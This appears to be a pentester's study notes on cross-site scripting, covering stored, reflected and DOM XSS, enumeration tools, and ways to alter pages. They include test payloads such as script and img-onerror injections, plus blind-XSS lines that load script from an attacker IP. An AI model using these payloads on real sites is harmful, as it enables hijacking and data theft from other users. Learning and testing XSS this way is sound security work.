## overview
- the attacker submits data that is stored on the server
	- the attacker knows the submitted data will be rendered on the client side for other users (ie. comments)
- the submitted data is a frontend coding injection that will execute js on the victim client

### XSS enumerators
- [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)
- [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://owasp.org/www-project-zap/)

### Note
- XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
- Manually testing XSS is not optimal
	- make a python script with multiple XSS payloads and have a built in function that detects  success/failure cases
	-  do manual code review
		- <font style="color:#CF0000">review the html output and see how your input is handeled</font>
		- most applications test their security against public XSS scripts so those will get patched
- if client side testing shows nothing, try testing inputs that go through server side
### testing for XSS
- upload to a field
```
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
```
- blind XSS (may need script \[direct js to execute\], and php files)
```
'><script src=http://10.10.14.44:89/script.js></script>
<script>$.getScript("http://10.10.14.44:89")</script><script
```
-  test if XSS is stored
- for reflected XSS
	- because the server does not store the payload, you need to send a link that has the payload attached. 
	- processed by backend first
	- try editing the url parameters
- for DOM XSS
	- no involvement with backend
	- JS on frontend will update the page but only after base page source is retrieved by browser
		- refreshing will clear the payload
	- detecting DOM vulnerability
		- js payload is not displayed in the html and does not execute
		- parts
			- source: js object that stores user input
			- sink: js function that writes user input to a DOM object
		- exploiting DOM XSS
			- make sure JS object stores the full payload part of your input
				- look in their js file
			- make sure the JS function allows the html tags you use
				- ex. innerhtml does not allow script tags
				- a good DOM XSS payload:
			```
			<img src="" onerror=alert(window.origin)>
			```
### XSS attacks
- editing frontend code methods
	- you can remove existing DOM elements with `document.getElementById().remove()` element in js
	- you can comment out the entirety of the html code after your inject with an open html comment `<!--` 
	- js can be injected into html pages with the `<script>` tag
- functionality
	-  if your attack involves receiving data from the victim don't forget to start a listener on your attacker device
	- if you want the website to be functional after submitting data, you need to upload a php file to properly handle website functionality